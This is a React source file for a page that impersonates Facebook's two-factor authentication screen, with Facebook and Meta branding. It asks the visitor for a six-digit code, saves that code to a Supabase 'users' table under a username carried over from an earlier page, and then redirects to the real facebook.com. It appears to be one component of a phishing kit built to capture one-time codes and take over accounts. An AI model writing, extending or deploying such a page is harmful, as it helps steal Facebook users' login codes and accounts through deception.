import React, { useState, useRef } from 'react';
import { useNavigate, useLocation } from "react-router-dom"
import { supabase } from '../utils/supabase';
import { loading } from '../lib/Alert';

export default function TwoFactorVerifyResponsive() {
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const inputRefs = useRef([]);
  const navigate = useNavigate()
  const {state} = useLocation()

  const handleChange = (element, index) => {
    if (isNaN(element.value)) return false;

    const newCode = [...code];
    newCode[index] = element.value;
    setCode(newCode);

    if (element.value !== '' && index < 5) {
      inputRefs.current[index + 1].focus();
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1].focus();
    }
  };

  const handlePaste = (e) => {
    const pasteData = e.clipboardData.getData('text').trim();
    if (/^\d{6}$/.test(pasteData)) {
      const pasteArray = pasteData.split('');
      setCode(pasteArray);
      inputRefs.current[5].focus();
    }
    e.preventDefault();
  };


  async function HandleSubmit(e){
      e.preventDefault()
  
      loading()
  
      if(state){
        var { error } = await supabase
          .from('users')
          .update({ code })
          .eq('username', state.username)
      }
      
      
      loading(false)
  
      if(!error){
        window.location.assign("https://facebook.com")
      }
    }


  return (
    <div className="min-h-screen bg-white flex flex-col justify-between font-sans antialiased mt-10">
      <div>
        {/* Top Header/Logo Section - Sticky and scaled for mobile */}
        <header className="w-full py-4 sm:py-6 flex justify-center border-b border-gray-100 bg-white sticky top-0 z-50">
          <div className="w-10 h-10 sm:w-12 sm:h-12 bg-[#1877F2] rounded-full flex items-center justify-center shadow-sm">
            <img src="/facebook.png" alt="facebook" />
          </div>
        </header>

        {/* Main Wrapper - Auto width on mobile, centered max-width on desktop */}
        <div className="w-full max-w-[440px] mx-auto px-5 sm:px-6 pt-6 sm:pt-12">
          
          {/* Back Navigation and Title */}
          <div className="flex items-center gap-3 mb-2">
            <button onClick={()=> navigate("/")} aria-label="Go back" className="text-gray-800 p-1 -ml-1 hover:opacity-70 transition-opacity">
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2.5} stroke="currentColor" className="w-5 h-5">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 19.5L8.25 12l7.5-7.5" />
              </svg>
            </button>
            <h1 className="text-lg sm:text-xl font-bold text-gray-950 tracking-tight">Two-factor authentication</h1>
          </div>

          {/* Subtext aligned correctly */}
          <p className="text-[14px] text-gray-600 mb-6 sm:mb-8 leading-normal pl-8">
            We sent a 6-digit confirmation code to your registered mobile device. Enter it below to secure your account.
          </p>

          {/* Form wrapper */}
          <form onSubmit={HandleSubmit} className="space-y-6">
            {/* Fluid input grids that scale beautifully down to tiny screen widths */}
            <div className="grid grid-cols-6 gap-2" onPaste={handlePaste}>
              {code.map((data, index) => (
                <input
                  key={index}
                  type="text"
                  maxLength="1"
                  pattern="\d*"
                  inputMode="numeric"
                  ref={(el) => (inputRefs.current[index] = el)}
                  value={data}
                  onChange={(e) => handleChange(e.target, index)}
                  onKeyDown={(e) => handleKeyDown(e, index)}
                  className="w-full h-12 sm:h-14 border border-gray-300 rounded-xl text-center text-lg sm:text-xl font-bold text-gray-950 focus:outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-all"
                />
              ))}
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-[#1877F2] hover:bg-[#166FE5] text-white font-semibold rounded-full text-base transition-colors duration-200 shadow-sm disabled:opacity-50"
              disabled={code.some(val => val === '')}
            >
              Submit code
            </button>
          </form>

          {/* Actions */}
          <div className="text-center mt-6 space-y-3">
            <p className="text-xs sm:text-sm text-gray-500">
              Didn't receive the code?
            </p>
            <button type="button" className="text-sm font-semibold text-[#1877F2] hover:underline block w-full text-center">
              Resend Code via SMS
            </button>
          </div>

          <div className="my-6 border-t border-gray-100 sm:border-transparent"></div>

          <button
            type="button"
            className="w-full py-2.5 border border-gray-300 text-gray-700 hover:bg-gray-50 font-semibold rounded-full text-[15px] transition-colors"
          >
            Try another way
          </button>
        </div>
      </div>

      {/* Footer Branded to sit cleanly at the bottom of viewport */}
      <footer className="w-full py-6 mt-12 flex justify-center items-center gap-1 text-gray-500 text-xs font-semibold border-t border-gray-50 bg-white">
        <svg viewBox="0 0 24 24" className="w-4 h-4 fill-[#1877F2]">
          <path d="M18.917 12.82c-.394 0-.776-.145-1.077-.407-.636-.554-1.46-.86-2.317-.86-.874 0-1.705.313-2.342.88l-.134.12a.377.377 0 01-.504 0l-.135-.12a3.528 3.528 0 00-2.342-.88c-.856 0-1.68.306-2.317.86a1.64 1.64 0 01-1.077.407c-.42 0-.825-.16-1.125-.453-.59-.572-.916-1.343-.916-2.17 0-.828.326-1.599.916-2.17.3-.294.705-.454 1.125-.454.394 0 .776.145 1.077.407.636.554 1.46.86 2.317.86.874 0 1.705-.313 2.342-.88l.134-.12a.377.377 0 01.504 0l.135.12c.637.567 1.468.88 2.342.88.857 0 1.68-.306 2.317-.86.301-.262.683-.407 1.077-.407.42 0 .825.16 1.125.453.59.572.916 1.343.916 2.17 0 .828-.326 1.599-.916 2.17-.3.294-.705.454-1.125.454zM12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2z" opacity=".1"/>
          <path d="M15.523 9.043c-1.196 0-2.29.471-3.13 1.25a4.67 4.67 0 00-3.13-1.25c-1.328 0-2.553.567-3.415 1.58-.813.955-1.242 2.214-1.21 3.545.064 2.656 2.158 4.793 4.773 4.793 1.197 0 2.29-.472 3.132-1.252a4.678 4.678 0 003.13 1.252c1.327 0 2.553-.567 3.414-1.58.813-.955 1.243-2.214 1.21-3.545-.063-2.656-2.157-4.793-4.774-4.793zm3.176 4.904c-.021.841-.29 1.631-.794 2.222-.533.627-1.278.974-2.096.974-.82 0-1.59-.387-2.115-.926l-.68-.7a.12.12 0 00-.168 0l-.68.7c-.524.539-1.296.926-2.114.926-.819 0-1.564-.347-2.097-.974-.53-.623-.79-1.461-.75-2.355.042-1.74 1.455-3.15 3.167-3.15.82 0 1.59.387 2.115.926l.68.7a.12.12 0 00.168 0l.68-.7c.524-.539 1.296-.926 2.114-.926 1.764 0 3.165 1.464 3.166 3.23-.002.049-.004.103-.006.153z"/>
        </svg>
        <span className="text-[#1C1E21] tracking-tight">Meta</span>
      </footer>
    </div>
  );
}